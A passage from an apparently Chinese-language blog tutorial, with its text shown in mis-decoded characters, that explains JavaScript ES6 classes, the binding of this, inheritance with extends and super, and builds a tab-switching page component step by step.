<strong>(é€—å·)</strong></li></ol><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.åˆ›å»ºç±» class åˆ›å»ºä¸€ä¸ªæ˜æ˜¾ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">uname, age</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname <span class="comment">//this æŒ‡å‘åˆ›å»ºçš„å®ä¾‹  this=&gt;ldh</span></span><br><span class="line">    <span class="built_in">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">sing</span>(<span class="params">song</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.uname + <span class="string">&#x27;å”±&#x27;</span> + song)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.åˆ©ç”¨ç±»åˆ›å»ºå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;åˆ˜å¾·å&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="keyword">let</span> zxy = <span class="keyword">new</span> Star(<span class="string">&#x27;å¼ å­¦å‹&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ldh); <span class="comment">//  &#123;uname: &quot;åˆ˜å¾·å&quot;, age: 18&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(zxy); <span class="comment">//  &#123;uname: &quot;å¼ å­¦å‹&quot;, age: 20&#125;</span></span><br><span class="line"></span><br><span class="line">ldh.sing(<span class="string">&#x27;å†°é›¨&#x27;</span>) <span class="comment">//åˆ˜å¾·åå”±å†°é›¨</span></span><br><span class="line">zxy.sing(<span class="string">&#x27;æé¦™å…°&#x27;</span>) <span class="comment">//å¼ å­¦å‹å”±æé¦™å…°</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol><li>åœ¨Es6ä¸­ç±»<strong>æ²¡æœ‰å˜é‡æå‡</strong>ï¼Œæ‰€ä»¥å¿…é¡»å…ˆ<strong>å®šä¹‰ç±»</strong>ï¼Œ<strong>æ‰èƒ½</strong>é€šè¿‡ç±»<strong>å®ä¾‹åŒ–</strong>å¯¹è±¡</li><li>ç±»é‡Œé¢å…±æœ‰çš„å±æ€§å’Œæ–¹æ³•<strong>ä¸€å®šè¦åŠ thisä½¿ç”¨</strong></li><li>ç±»é‡Œè¾¹çš„thisæŒ‡å‘é—®é¢˜<ul><li><strong>constructoré‡Œé¢çš„thisæŒ‡å‘å®ä¾‹å¯¹è±¡</strong></li><li><strong>æ–¹æ³•é‡Œé¢çš„thisæŒ‡å‘è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨è€…</strong></li></ul></li></ol><h3 id="thisæŒ‡å‘é—®é¢˜æ¡ˆä¾‹"><a href="#thisæŒ‡å‘é—®é¢˜æ¡ˆä¾‹" class="headerlink" title="thisæŒ‡å‘é—®é¢˜æ¡ˆä¾‹"></a><strong>thisæŒ‡å‘é—®é¢˜æ¡ˆä¾‹</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> that;</span><br><span class="line"><span class="keyword">var</span> _that;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">uname, age</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// constructor é‡Œé¢çš„this æŒ‡å‘çš„æ˜¯ åˆ›å»ºçš„å®ä¾‹å¯¹è±¡</span></span><br><span class="line">        that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.uname = uname;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="comment">// this.sing();</span></span><br><span class="line">        <span class="built_in">this</span>.btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.btn.onclick = <span class="built_in">this</span>.sing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">sing</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªsingæ–¹æ³•é‡Œé¢çš„this æŒ‡å‘çš„æ˜¯ btn è¿™ä¸ªæŒ‰é’®,å› ä¸ºè¿™ä¸ªæŒ‰é’®è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(that.uname); <span class="comment">// that.unameåˆ˜å¾·å thaté‡Œé¢å­˜å‚¨çš„æ˜¯constructoré‡Œé¢çš„this  </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">dance</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªdanceé‡Œé¢çš„this æŒ‡å‘çš„æ˜¯å®ä¾‹å¯¹è±¡ ldh å› ä¸ºldh è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">        _that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>); <span class="comment">//Star &#123;uname: &quot;åˆ˜å¾·å&quot;, age: undefined, btn: button&#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;åˆ˜å¾·å&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(that === ldh); <span class="comment">//true</span></span><br><span class="line">ldh.dance();</span><br><span class="line"><span class="built_in">console</span>.log(_that === ldh); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h2><blockquote><p>ç»§æ‰¿ä¸­ï¼Œå¦‚æœå®ä¾‹åŒ–å­ç±»è¾“å‡ºä¸€ä¸ªæ–¹æ³•ï¼Œå…ˆçœ‹å­ç±»æœ‰æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå¦‚æœæœ‰å°±å…ˆæ‰§è¡Œå­ç±»çš„æ–¹æ³•ï¼Œå¦‚æœå­ç±»é‡Œé¢æ²¡æœ‰ï¼Œå°±å»æŸ¥æ‰¾çˆ¶ç±»æœ‰æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå¦‚æœæœ‰ï¼Œå°±æ‰§è¡Œçˆ¶ç±»çš„è¿™ä¸ªæ–¹æ³•ï¼ˆå°±è¿‘åŸ åˆ™ï¼‰</p></blockquote><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line"><span class="comment">//çˆ¶ç±»</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line"><span class="comment">//å­ç±»ç»§æ‰¿çˆ¶ç±»</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.ç±»çš„ç»§æ‰¿</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">money</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line">son.money()  <span class="comment">//100</span></span><br></pre></td></tr></table></figure><h3 id="super-è¶…çº§çš„-å…³é”®å­—"><a href="#super-è¶…çº§çš„-å…³é”®å­—" class="headerlink" title="super(è¶…çº§çš„) å…³é”®å­—"></a>super(è¶…çº§çš„) å…³é”®å­—</h3><p><strong>super</strong>å…³é”®å­—ç”¨äºè®¿é—®å’Œè°ƒç”¨å¯¹è±¡çˆ¶ç±»ä¸Šçš„å‡½æ•°ã€‚å¯ä»¥<strong>è°ƒç”¨</strong>çˆ¶ç±»çš„<strong>æ„é€ å‡½æ•°</strong>ï¼Œ<strong>ä¹Ÿå¯ä»¥è°ƒç”¨</strong>çˆ¶ç±»çš„<strong>æ™®é€šå‡½æ•°</strong></p><p>ç¤ºä¾‹ï¼šè°ƒç”¨<strong>æ„é€ å‡½æ•°</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x</span><br><span class="line">    <span class="built_in">this</span>.y = y</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">sum</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x + <span class="built_in">this</span>.y)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// è¿™é‡Œä¸èƒ½è®¿é—®çˆ¶ç±»çš„ this,çˆ¶ç±»çš„sumå‡½æ•°ä¸­çš„thisæ˜¯çˆ¶ç±»çš„ï¼Œå­ç±»å€¼æ²¡æœ‰ä¼ é€’è¿›å»</span></span><br><span class="line">    <span class="comment">// this.x = x // æŠ¥é”™</span></span><br><span class="line">    <span class="comment">// this.y = y // æŠ¥é”™</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>(x,y);<span class="comment">//è°ƒç”¨çˆ¶ç±»ä¸­çš„æ„é€ å‡½æ•°</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">son.sum() <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šè°ƒç”¨<strong>æ™®é€šå‡½æ•°</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// superè°ƒç”¨çˆ¶ç±»çš„æ™®é€šå‡½æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">say</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;æˆ‘æ˜¯çˆ¸çˆ¸&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">say</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">   <span class="comment">//è°ƒç”¨çˆ¶ç±»çš„æ™®é€šæ–¹æ³•</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">super</span>.say()); <span class="comment">//æˆ‘æ˜¯çˆ¸çˆ¸</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br></pre></td></tr></table></figure><h3 id="ç»§æ‰¿æ–¹æ³•çš„åŒæ—¶æ‰©å±•æ–¹æ³•"><a href="#ç»§æ‰¿æ–¹æ³•çš„åŒæ—¶æ‰©å±•æ–¹æ³•" class="headerlink" title="ç»§æ‰¿æ–¹æ³•çš„åŒæ—¶æ‰©å±•æ–¹æ³•"></a>ç»§æ‰¿æ–¹æ³•çš„åŒæ—¶æ‰©å±•æ–¹æ³•</h3><p>éœ€æ±‚ï¼šç»§æ‰¿çˆ¶ç±»çš„åŠ æ³•æ–¹æ³•çš„åŒæ—¶ï¼Œè‡ªå·±æ‰©å±•ä¸€ä¸ªå‡æ³•æ–¹æ³•ã€‚</p><p>æ³¨æ„äº‹é¡¹ï¼š<strong>è°ƒç”¨çˆ¶ç±»çš„å‡½æ•°æ—¶</strong>ï¼Œsuperå¿…é¡»åœ¨å­ç±»thisä¹‹å‰è°ƒç”¨(<strong>çˆ¶äº²å¿…é¡»æ”¾åœ¨ä¹‹å‰</strong>)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// çˆ¶ç±»åŠ æ³•æ“ä½œ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x</span><br><span class="line">    <span class="built_in">this</span>.y = y</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">sum</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x + <span class="built_in">this</span>.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å­ç±»ç»§æ‰¿çˆ¶ç±»åŠ æ³•æ–¹æ³•çš„åŒæ—¶æ‰©å±•å‡æ³•æ“ä½œ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•° superå¿…é¡»åœ¨å­ç±»thisä¹‹å‰è°ƒç”¨(çˆ¶äº²å¿…é¡»æ”¾åœ¨ä¹‹å‰)</span></span><br><span class="line">    <span class="built_in">super</span>(x, y)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.x = x</span><br><span class="line">    <span class="built_in">this</span>.y = y</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">subtract</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x - <span class="built_in">this</span>.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">son.subtract() <span class="comment">// 2</span></span><br><span class="line">son.sum() <span class="comment">// 8</span></span><br></pre></td></tr></table></figure><h2 id="Tabæ -æ¡ˆä¾‹"><a href="#Tabæ -æ¡ˆä¾‹" class="headerlink" title="Tabæ  æ¡ˆä¾‹"></a>Tabæ  æ¡ˆä¾‹</h2><p>åŠŸèƒ½æè¿°ï¼š</p><ol><li>ç‚¹å‡»Tabæ èƒ½å®ç°<strong>åˆ‡æ¢</strong></li><li>Tabæ å’Œå†…å®¹ ç‚¹å‡»å³ä¸Šè§’Ã—å·èƒ½<strong>åˆ é™¤</strong>å½“å‰<strong>æ ç›®å’Œå†…å®¹</strong></li><li>ç‚¹å‡»åŠ å·èƒ½å®ç°<strong>å¢åŠ Tabæ </strong>åŠŸèƒ½</li><li><strong>åŒå‡»Tabæ </strong>ï¼Œå¯ä»¥<strong>ç¼–è¾‘Tabæ åç§°</strong></li><li><strong>åŒå‡»å†…å®¹</strong>ï¼Œå¯<strong>ç¼–è¾‘å†…å®¹</strong></li></ol><h3 id="æ¨¡å—åˆ’åˆ†"><a href="#æ¨¡å—åˆ’åˆ†" class="headerlink" title="æ¨¡å—åˆ’åˆ†"></a>æ¨¡å—åˆ’åˆ†</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tab</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–å…ƒç´ </span></span><br><span class="line">        <span class="built_in">this</span>.main = <span class="built_in">document</span>.querySelector(id);</span><br><span class="line">        <span class="built_in">this</span>.lis = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.sections = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;section&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// init åˆå§‹åŒ–æ“ä½œè®©ç›¸å…³çš„å…ƒç´ ç»‘å®šäº‹ä»¶</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">            <span class="comment">//æ–¹æ³•åé¢ä¸èƒ½åŠ ï¼ˆï¼‰ï¼Œå¦åˆ™ç›´æ¥è°ƒç”¨</span></span><br><span class="line">            <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab;</span><br><span class="line">            <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab;</span><br><span class="line">            <span class="built_in">this</span>.spans[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">            <span class="built_in">this</span>.sections[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 1. åˆ‡æ¢åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">toggleTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 2. æ·»åŠ åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">addTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 3. åˆ é™¤åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">removeTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 4. ä¿®æ”¹åŠŸèƒ½</span></span><br><span class="line">    <span class="function"><span class="title">editTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Tab(<span class="string">&#x27;#tab&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="ç‚¹å‡»Tabæ èƒ½å®ç°åˆ‡æ¢-Tabæ å’Œå†…å®¹"><a href="#ç‚¹å‡»Tabæ èƒ½å®ç°åˆ‡æ¢-Tabæ å’Œå†…å®¹" class="headerlink" title="ç‚¹å‡»Tabæ èƒ½å®ç°åˆ‡æ¢ Tabæ å’Œå†…å®¹"></a>ç‚¹å‡»Tabæ èƒ½å®ç°åˆ‡æ¢ Tabæ å’Œå†…å®¹</h3><p><img src="https://i.loli.net/2021/06/06/Wi6KfSmcpPLqTJC.gif" alt="åˆ‡æ¢tabé¡µ.gif"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. åˆ‡æ¢åŠŸèƒ½</span></span><br><span class="line"><span class="function"><span class="title">toggleTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// é€šè¿‡var that = this ä¿å­˜æœ€åˆè°ƒç”¨çš„thisæŒ‡å‘</span></span><br><span class="line">    that.clearClass();</span><br><span class="line">    <span class="built_in">this</span>.className = <span class="string">&#x27;liactive&#x27;</span>;</span><br><span class="line">    that.sections[<span class="built_in">this</span>.index].className = <span class="string">&#x27;conactive&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ¸…é™¤æ‰€æœ‰li å’Œsection çš„ç±»</span></span><br><span class="line"><span class="function"><span class="title">clearClass</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="built_in">this</span>.sections[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç‚¹å‡»åŠ å·èƒ½å®ç°å¢åŠ Tabæ æ•ˆæœ"><a href="#ç‚¹å‡»åŠ å·èƒ½å®ç°å¢åŠ Tabæ æ•ˆæœ" class="headerlink" title="ç‚¹å‡»åŠ å·èƒ½å®ç°å¢åŠ Tabæ æ•ˆæœ"></a>ç‚¹å‡»åŠ å·èƒ½å®ç°å¢åŠ Tabæ æ•ˆæœ</h3><p><img src="https://i.loli.net/2021/06/06/ROI3PrLAwiGjCKp.gif" alt="æ–°å¢tabé¡µ.gif"></p><blockquote><p>å¦‚ä¸‹ä»£ç éƒ½ä¸ºåœ¨åŸæ¥çš„åŸºç¡€ä¸Šæ–°å¢</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// è·å–å…ƒç´ </span></span><br><span class="line">    <span class="built_in">this</span>.add = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabadd&#x27;</span>);</span><br><span class="line">    <span class="comment">// liçš„çˆ¶å…ƒç´ </span></span><br><span class="line">    <span class="built_in">this</span>.ul = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.fisrstnav ul:first-child&#x27;</span>);</span><br><span class="line">    <span class="comment">// section çˆ¶å…ƒç´ </span></span><br><span class="line">    <span class="built_in">this</span>.fsection = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabscon&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.updateNode();</span><br><span class="line">    <span class="comment">// init åˆå§‹åŒ–æ“ä½œè®©ç›¸å…³çš„å…ƒç´ ç»‘å®šäº‹ä»¶</span></span><br><span class="line">    <span class="built_in">this</span>.add.onclick = <span class="built_in">this</span>.addTab;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å› ä¸ºæˆ‘ä»¬åŠ¨æ€æ·»åŠ å…ƒç´  æ‰€ä»¥éœ€è¦é‡æ–°è·å–å¯¹åº”çš„å…ƒç´  è¿™æ ·å°±ä¸ä¼šå‡ºç°ç‚¹å‡»æ–°å¢tabæ²¡æœ‰ç›¸åº”äº‹ä»¶çš„bug</span></span><br><span class="line"><span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.lis = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.sections = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;section&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2. æ·»åŠ åŠŸèƒ½</span></span><br><span class="line"><span class="function"><span class="title">addTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    that.clearClass();</span><br><span class="line">    <span class="comment">// (1) åˆ›å»ºliå…ƒç´ å’Œsectionå…ƒç´  </span></span><br><span class="line">    <span class="keyword">var</span> random = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> li = <span class="string">&#x27;&lt;li class=&quot;liactive&quot;&gt;&lt;span&gt;æ–°é€‰é¡¹å¡&lt;/span&gt;&lt;span class=&quot;iconfont icon-guanbi&quot;&gt;&lt;/span&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> section = <span class="string">&#x27;&lt;section class=&quot;conactive&quot;&gt;æµ‹è¯• &#x27;</span> + random + <span class="string">&#x27;&lt;/section&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">// (2) æŠŠè¿™ä¸¤ä¸ªå…ƒç´ è¿½åŠ åˆ°å¯¹åº”çš„çˆ¶å…ƒç´ é‡Œé¢</span></span><br><span class="line">    that.ul.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, li);</span><br><span class="line">    that.fsection.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, section);</span><br><span class="line">    <span class="comment">// (3)æœ€ååˆå§‹åŒ–ï¼Œé‡æ–°è·å–èŠ‚ç‚¹</span></span><br><span class="line">    that.init(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç‚¹å‡»å³ä¸Šè§’Ã—å·èƒ½åˆ é™¤å½“å‰æ ç›®å’Œå†…å®¹"><a href="#ç‚¹å‡»å³ä¸Šè§’Ã—å·èƒ½åˆ é™¤å½“å‰æ ç›®å’Œå†…å®¹" class="headerlink" title="ç‚¹å‡»å³ä¸Šè§’Ã—å·èƒ½åˆ é™¤å½“å‰æ ç›®å’Œå†…å®¹"></a>ç‚¹å‡»å³ä¸Šè§’Ã—å·èƒ½åˆ é™¤å½“å‰æ ç›®å’Œå†…å®¹</h3><p><img src="https://i.loli.net/2021/06/06/cRVQv5kJtOYoz73.gif" alt="åˆ é™¤tabé¡µ.gif"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">           <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">   <span class="comment">//åˆ é™¤æ—¶ä¹Ÿæ˜¯åŠ¨æ€æ·»åŠ å…ƒç´ äº†ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°è·å–</span></span><br><span class="line">       <span class="built_in">this</span>.remove = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.icon-guanbi&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 3. åˆ é™¤åŠŸèƒ½</span></span><br><span class="line">   <span class="function"><span class="title">removeTab</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">       <span class="comment">// é˜»æ­¢å†’æ³¡ é˜²æ­¢è§¦å‘li çš„åˆ‡æ¢ç‚¹å‡»äº‹ä»¶ï¼</span></span><br><span class="line">       e.stopPropagation(); </span><br><span class="line">       <span class="comment">//xæ²¡æœ‰ç´¢å¼•å·ï¼Œä½†æ˜¯å¯ä»¥æ‹¿åˆ°çˆ¶äº²çš„ç´¢å¼•</span></span><br><span class="line">       <span class="keyword">var</span> index = <span class="built_in">this</span>.parentNode.index;</span><br><span class="line">       <span class="comment">// æ ¹æ®ç´¢å¼•å·åˆ é™¤å¯¹åº”çš„li å’Œsection   remove()æ–¹æ³•å¯ä»¥ç›´æ¥åˆ é™¤æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line">       that.lis[index].remove();</span><br><span class="line">       that.sections[index].remove();</span><br><span class="line">       <span class="comment">//åˆ é™¤å®Œåé‡æ–°è·å–èŠ‚ç‚¹æ•°ç›®</span></span><br><span class="line">       that.init();</span><br><span class="line">       <span class="comment">// å½“æˆ‘ä»¬åˆ é™¤çš„ä¸æ˜¯é€‰ä¸­çŠ¶æ€çš„li çš„æ—¶å€™,åŸæ¥çš„é€‰ä¸­çŠ¶æ€liä¿æŒä¸å˜(å³ä¸æ‰§è¡Œindex--åé¢ä»£ç )</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">document</span>.querySelector(<span class="string">&#x27;.liactive&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line">       <span class="comment">// å½“æˆ‘ä»¬åˆ é™¤äº†é€‰ä¸­çŠ¶æ€çš„è¿™ä¸ªli çš„æ—¶å€™, 